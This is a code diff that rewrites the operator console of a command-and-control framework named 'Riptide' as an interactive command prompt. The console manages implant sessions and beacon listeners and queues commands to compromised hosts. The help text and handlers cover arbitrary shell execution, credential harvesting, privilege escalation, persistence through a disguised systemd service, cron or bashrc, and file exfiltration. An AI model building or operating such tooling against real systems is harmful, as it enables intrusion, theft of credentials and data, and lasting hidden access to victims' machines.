@@ -1,207 +1,310 @@
-/// C2 Operator Console — interactive TUI for managing implants.
+/// Riptide Operator Console — interactive REPL for managing implants.
 ///
 /// Usage:
-///   console --server http://127.0.0.1:8080
-///   console --server https://10.0.0.1:8443 --no-tls-verify
+///   riptide-console                                    # connects to localhost:10337
+///   riptide-console --server http://10.0.0.1:10337     # custom server
+///   riptide-console --server https://c2:10337 --no-tls-verify
 use clap::Parser;
-use crossterm::{
-    event::{self, DisableMouseCapture, EnableMouseCapture, Event, KeyCode, KeyEventKind},
-    execute,
-    terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen},
-};
-use ratatui::{
-    backend::{Backend, CrosstermBackend},
-    Terminal,
-};
-use std::io;
+use rustyline::error::ReadlineError;
+use rustyline::{DefaultEditor, Result as RlResult};
 
 mod api;
-mod app;
-mod ui;
 
 #[derive(Parser)]
-#[command(name = "console", about = "C2 Operator Console")]
+#[command(name = "riptide-console", about = "Riptide C2 Operator Console")]
 struct Cli {
-    /// C2 server URL
     #[arg(long, default_value = "http://127.0.0.1:10337")]
     server: String,
 
-    /// Skip TLS certificate verification
     #[arg(long)]
     no_tls_verify: bool,
-
-    /// Non-interactive mode (for scripting)
-    #[arg(long)]
-    no_tui: bool,
 }
 
 #[tokio::main]
-async fn main() -> io::Result<()> {
+async fn main() -> RlResult<()> {
     let cli = Cli::parse();
+    let client = api::C2Client::new(&cli.server, cli.no_tls_verify);
 
-    if cli.no_tui {
-        // Non-interactive mode: just print sessions
-        let client = api::C2Client::new(&cli.server, cli.no_tls_verify);
-        match client.list_sessions().await {
-            Ok(resp) => {
-                println!("Sessions ({}):", resp.count);
-                for s in &resp.sessions {
-                    let last_seen = chrono::DateTime::parse_from_rfc3339(&s.last_seen)
-                        .unwrap_or_else(|_| chrono::DateTime::UNIX_EPOCH.into());
-                    let now: chrono::DateTime<chrono::Utc> = chrono::Utc::now();
-                    let ago = now.signed_duration_since(last_seen).num_seconds();
-                    println!(
-                        "  {} | {} | {} | {} | {} | {}s ago",
-                        s.implant_id, s.hostname, s.tier, s.privileges, s.status, ago,
-                    );
-                }
-            }
-            Err(e) => eprintln!("Error: {}", e),
-        }
-        return Ok(());
+    // Verify connection
+    match client.list_sessions().await {
+        Ok(resp) => println!("Riptide console — {} — {} session(s)\n", cli.server, resp.count),
+        Err(e) => eprintln!("[!] Cannot reach C2 at {}: {}\n", cli.server, e),
     }
 
-    // Interactive TUI mode
-    enable_raw_mode()?;
-    let mut stdout = io::stdout();
-    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
-    let backend = CrosstermBackend::new(stdout);
-    let mut terminal = Terminal::new(backend)?;
+    println!("Type 'help' for commands, 'quit' to exit.\n");
 
-    let client = api::C2Client::new(&cli.server, cli.no_tls_verify);
-    let mut app = app::App::new(client);
+    let mut rl = DefaultEditor::new()?;
+    let _ = rl.load_history("/tmp/.riptide_history");
 
-    let result = run_tui(&mut terminal, &mut app).await;
-
-    // Cleanup
-    disable_raw_mode()?;
-    execute!(
-        terminal.backend_mut(),
-        LeaveAlternateScreen,
-        DisableMouseCapture
-    )?;
-    terminal.show_cursor()?;
-
-    result
-}
-
-async fn run_tui<B: Backend>(terminal: &mut Terminal<B>, app: &mut app::App) -> io::Result<()> {
-    // Initial session fetch
-    app.refresh_sessions().await;
+    let mut selected_id: Option<String> = None;
 
     loop {
-        terminal.draw(|f| ui::render(f, app))?;
+        let prompt = if let Some(ref id) = selected_id {
+            format!("[{}] > ", id.chars().take(8).collect::<String>())
+        } else {
+            "riptide> ".into()
+        };
 
-        // Poll for events with a 500ms timeout
-        if event::poll(std::time::Duration::from_millis(500))? {
-            if let Event::Key(key) = event::read()? {
-                if key.kind == KeyEventKind::Press {
-                    match key.code {
-                        KeyCode::Char('q') => {
-                            if app.input_mode == app::InputMode::Normal {
-                                app.running = false;
-                                break;
-                            } else {
-                                app.input_buffer.push('q');
-                            }
+        let line = match rl.readline(&prompt) {
+            Ok(l) => l,
+            Err(ReadlineError::Interrupted | ReadlineError::Eof) => break,
+            Err(e) => { eprintln!("Error: {}", e); break; }
+        };
+
+        let line = line.trim().to_string();
+        if line.is_empty() { continue; }
+        let _ = rl.add_history_entry(&line);
+
+        let parts: Vec<&str> = line.splitn(2, ' ').collect();
+        let cmd = parts[0];
+        let arg = parts.get(1).unwrap_or(&"");
+
+        match cmd {
+            "quit" | "exit" | "q" => break,
+
+            "help" | "?" => print_help(),
+
+            "sessions" | "list" => {
+                match client.list_sessions().await {
+                    Ok(resp) => {
+                        if resp.sessions.is_empty() {
+                            println!("  (no active sessions)");
                         }
-                        KeyCode::Esc => {
-                            if app.input_mode == app::InputMode::Editing {
-                                app.input_mode = app::InputMode::Normal;
-                                app.input_buffer.clear();
-                            } else if app.selected_session.is_some() {
-                                app.selected_session = None;
-                                app.interact_history.clear();
-                            }
+                        for s in &resp.sessions {
+                            let ago = client::parse_ago(&s.last_seen);
+                            println!("  {:12} {:30} {:8} {:6} {}",
+                                s.hostname, s.implant_id, s.status, s.privileges, ago);
                         }
-                        KeyCode::Enter => {
-                            if app.input_mode == app::InputMode::Editing {
-                                let cmd = app.input_buffer.clone();
-                                app.input_buffer.clear();
-                                app.input_mode = app::InputMode::Normal;
-                                app.execute_command(&cmd).await;
-                            } else if app.selected_session.is_none() {
-                                // Select highlighted session
-                                if let Some(s) = app.sessions.get(app.session_list_idx) {
-                                    let (id, hostname, ip, os, tier, uid, status) = (
-                                        s.implant_id.clone(),
-                                        s.hostname.clone(),
-                                        s.ip.clone(),
-                                        s.os.clone(),
-                                        s.tier.clone(),
-                                        s.uid,
-                                        s.status.clone(),
-                                    );
-                                    app.selected_session = Some(id.clone());
-                                    app.interact_history.clear();
-                                    app.input_mode = app::InputMode::Editing;
-                                    app.add_interact(&format!("Selected session: {} ({})", hostname, id));
-                                    app.add_interact(&format!(
-                                        "  IP: {} | OS: {} | Tier: {} | UID: {} | Status: {}",
-                                        ip, os, tier, uid, status
-                                    ));
-                                }
-                            }
+                    }
+                    Err(e) => println!("  Error: {}", e),
+                }
+            }
+
+            "use" | "select" => {
+                if arg.is_empty() {
+                    println!("  Usage: use <hostname-or-id>");
+                } else {
+                    match client.find_session(arg).await {
+                        Some(s) => {
+                            let id = s.implant_id.clone();
+                            println!("  Selected: {} ({})", s.hostname, id);
+                            println!("    IP: {} | OS: {} | UID: {} | Status: {}",
+                                s.ip, s.os, s.uid, s.status);
+                            selected_id = Some(id);
                         }
-                        KeyCode::Char('i') => {
-                            if app.selected_session.is_some() && app.input_mode == app::InputMode::Normal {
-                                app.input_mode = app::InputMode::Editing;
-                                app.input_buffer.clear();
-                            }
-                        }
-                        KeyCode::Char('r') => {
-                            if app.input_mode == app::InputMode::Normal {
-                                app.refresh_sessions().await;
-                            } else {
-                                app.input_buffer.push('r');
-                            }
-                        }
-                        KeyCode::Up => {
-                            if app.input_mode == app::InputMode::Normal {
-                                if app.selected_session.is_some() {
-                                    app.scroll_offset = app.scroll_offset.saturating_sub(1);
-                                } else {
-                                    app.session_list_idx = app.session_list_idx.saturating_sub(1);
-                                }
-                            } else {
-                                app.input_buffer.push_str("\x1b[A");
-                            }
-                        }
-                        KeyCode::Down => {
-                            if app.input_mode == app::InputMode::Normal {
-                                if app.selected_session.is_some() {
-                                    app.scroll_offset += 1;
-                                } else {
-                                    let max = app.sessions.len().saturating_sub(1);
-                                    if app.session_list_idx < max {
-                                        app.session_list_idx += 1;
-                                    }
-                                }
-                            } else {
-                                app.input_buffer.push_str("\x1b[B");
-                            }
-                        }
-                        KeyCode::Backspace => {
-                            if app.input_mode == app::InputMode::Editing {
-                                app.input_buffer.pop();
-                            }
-                        }
-                        KeyCode::Char(c) => {
-                            if app.input_mode == app::InputMode::Editing {
-                                app.input_buffer.push(c);
-                            }
-                        }
-                        _ => {}
+                        None => println!("  Session not found: {}", arg),
                     }
                 }
             }
-        }
 
-        // Auto-refresh sessions every 5 seconds
-        if app.refresh_timer.elapsed().as_secs() >= 5 {
-            app.refresh_sessions().await;
+            "back" | "unselect" => {
+                if selected_id.is_some() {
+                    println!("  Deselected.");
+                    selected_id = None;
+                }
+            }
+
+            "listeners" => {
+                let subparts: Vec<&str> = arg.splitn(2, ' ').collect();
+                match subparts[0] {
+                    "" => {
+                        match client.get_listeners().await {
+                            Ok(listeners) => {
+                                if listeners.is_empty() { println!("  (no active listeners)"); }
+                                for l in &listeners { println!("  :{} ({})", l.port, l.protocol); }
+                            }
+                            Err(e) => println!("  Error: {}", e),
+                        }
+                    }
+                    "add" | "start" => {
+                        let add_parts: Vec<&str> = subparts.get(1).unwrap_or(&"").splitn(2, ' ').collect();
+                        let port_str = add_parts[0];
+                        let proto = add_parts.get(1).unwrap_or(&"http");
+                        if let Ok(port) = port_str.parse::<u16>() {
+                            match client.start_listener(port, proto).await {
+                                Ok(info) => println!("  Started: :{} ({})", info.port, info.protocol),
+                                Err(e) => println!("  Error: {}", e),
+                            }
+                        } else {
+                            println!("  Usage: listeners add <port> [http|https]");
+                        }
+                    }
+                    "stop" | "remove" => {
+                        if let Ok(port) = subparts.get(1).unwrap_or(&"").parse::<u16>() {
+                            match client.stop_listener(port).await {
+                                Ok(()) => println!("  Stopped listener on :{}", port),
+                                Err(e) => println!("  Error: {}", e),
+                            }
+                        } else { println!("  Usage: listeners stop <port>"); }
+                    }
+                    _ => println!("  Usage: listeners [add <port>|stop <port>]"),
+                }
+            }
+
+            // Commands that require a selected session
+            cmd if selected_id.is_some() => {
+                let id = selected_id.as_ref().unwrap();
+                handle_session_cmd(&client, id, cmd, arg).await;
+            }
+
+            _ => println!("  Unknown command: {}. Type 'help'.", cmd),
         }
     }
 
+    let _ = rl.save_history("/tmp/.riptide_history");
+    println!("bye.");
     Ok(())
+}
+
+async fn handle_session_cmd(client: &api::C2Client, id: &str, cmd: &str, arg: &str) {
+    match cmd {
+        "shell" => {
+            if arg.is_empty() { println!("  Usage: shell <command>"); return; }
+            let cid = client.queue(id, "shell", "exec", &serde_json::json!({"cmd": arg})).await;
+            wait_and_show(client, id, cid, "shell").await;
+        }
+        "recon" => {
+            let action = if arg.is_empty() { "passive" } else { arg };
+            let cid = client.queue(id, "recon", action, &serde_json::json!({})).await;
+            wait_and_show(client, id, cid, "recon").await;
+        }
+        "creds" | "harvest" => {
+            let mode = if arg.is_empty() { "in_memory" } else { arg };
+            let cid = client.queue(id, "creds", "harvest", &serde_json::json!({"mode": mode})).await;
+            wait_and_show(client, id, cid, "creds").await;
+        }
+        "privesc" => {
+            let method = if arg.is_empty() { "copyfail" } else { arg };
+            let cid = client.queue(id, "privesc", method, &serde_json::json!({})).await;
+            wait_and_show(client, id, cid, "privesc").await;
+        }
+        "persist" => {
+            let subparts: Vec<&str> = arg.splitn(2, ' ').collect();
+            let action = subparts[0];
+            let extra = subparts.get(1).unwrap_or(&"");
+            let args = match action {
+                "systemd" => serde_json::json!({"service_name": if extra.is_empty() {"systemd-logind-helper"} else {extra}}),
+                _ => serde_json::json!({}),
+            };
+            if action.is_empty() { println!("  Usage: persist cron|systemd [name]|bashrc"); return; }
+            let cid = client.queue(id, "persist", action, &args).await;
+            wait_and_show(client, id, cid, "persist").await;
+        }
+        "exfil" => {
+            if arg.is_empty() { println!("  Usage: exfil <path>"); return; }
+            let cid = client.queue(id, "exfil", "file", &serde_json::json!({"path": arg})).await;
+            wait_and_show(client, id, cid, "exfil").await;
+        }
+        "download" => {
+            if arg.is_empty() { println!("  Usage: download <path>"); return; }
+            let cid = client.queue(id, "file", "read", &serde_json::json!({"path": arg})).await;
+            wait_and_show(client, id, cid, "download").await;
+        }
+        "marker" => {
+            let location = if arg.is_empty() { "operator" } else { arg };
+            let cid = client.queue(id, "marker", "write", &serde_json::json!({"location": location})).await;
+            wait_and_show(client, id, cid, "marker").await;
+        }
+        "info" => {
+            let cid = client.queue(id, "system", "info", &serde_json::json!({})).await;
+            wait_and_show(client, id, cid, "system").await;
+        }
+        "sleep" => {
+            if let Ok(secs) = arg.parse::<u64>() {
+                let cid = client.queue(id, "system", "sleep", &serde_json::json!({"secs": secs})).await;
+                wait_and_show(client, id, cid, "system").await;
+            } else { println!("  Usage: sleep <seconds>"); }
+        }
+        "exit" | "kill" => {
+            let cid = client.queue(id, "system", "exit", &serde_json::json!({})).await;
+            match cid {
+                Ok(ref c) => println!("  Queued exit command ({}).", &c[..8]),
+                Err(e) => println!("  Error: {}", e),
+            }
+        }
+        _ => println!("  Unknown command: {}. Type 'help'.", cmd),
+    }
+}
+
+async fn wait_and_show(client: &api::C2Client, id: &str, cid: Result<String, String>, label: &str) {
+    let cid = match cid {
+        Ok(c) => c,
+        Err(e) => { println!("  Error: {}", e); return; }
+    };
+    print!("  [{}] waiting.", label);
+    let mut dots = 0;
+    loop {
+        match client.command_result(id, &cid).await {
+            Some(result) => {
+                println!("\r  [{}] done:", label);
+                if let Some(obj) = result.as_object() {
+                    for (k, v) in obj {
+                        if let Some(s) = v.as_str() {
+                            if !s.is_empty() {
+                                for line in s.lines() { println!("    {}", line); }
+                            }
+                        } else if let Some(n) = v.as_u64() {
+                            if k != "exit_code" { println!("    {}: {}", k, n); }
+                        } else if let Some(b) = v.as_bool() {
+                            println!("    {}: {}", k, b);
+                        } else if v.is_object() || v.is_array() {
+                            let s = serde_json::to_string_pretty(v).unwrap_or_default();
+                            for line in s.lines().take(10) { println!("    {}", line); }
+                        }
+                    }
+                }
+                break;
+            }
+            None => {
+                dots = (dots + 1) % 4;
+                print!("\r  [{}] waiting{}", label, ".".repeat(dots));
+                tokio::time::sleep(std::time::Duration::from_secs(2)).await;
+            }
+        }
+    }
+}
+
+fn print_help() {
+    println!(r#"
+  ── Navigation ──
+  sessions, list          List active implant sessions
+  use <hostname-or-id>    Select a session
+  back                    Deselect session
+
+  ── Listeners ──
+  listeners               List active beacon listeners
+  listeners add <port> [http|https]
+  listeners stop <port>
+
+  ── Session Commands ──
+  shell <command>         Execute arbitrary shell command
+  recon [passive|active|arp]  Network reconnaissance
+  creds [in_memory|shell]     Credential harvesting
+  privesc [copyfail|pkexec]   Privilege escalation
+  persist cron|systemd [name]|bashrc
+  exfil <path>            Exfiltrate file
+  download <path>         Download file from implant
+  marker [label]          Write forensic marker
+  ── System ──
+  info                    Implant metadata (hostname, PID, OS)
+  sleep <seconds>         Change beacon interval
+  exit                    Terminate implant
+  ── Console ──
+  help                    Show this help
+  quit, exit, q           Exit console
+"#);
+}
+
+mod client {
+    use crate::api::C2Client;
+    pub fn parse_ago(last_seen: &str) -> String {
+        let parsed = chrono::DateTime::parse_from_rfc3339(last_seen)
+            .unwrap_or_else(|_| chrono::DateTime::UNIX_EPOCH.into());
+        let now: chrono::DateTime<chrono::Utc> = chrono::Utc::now();
+        let secs = now.signed_duration_since(parsed).num_seconds();
+        if secs < 60 { format!("{}s ago", secs) }
+        else if secs < 3600 { format!("{}m ago", secs / 60) }
+        else if secs < 86400 { format!("{}h ago", secs / 3600) }
+        else { format!("{}d ago", secs / 86400) }
+    }
 }
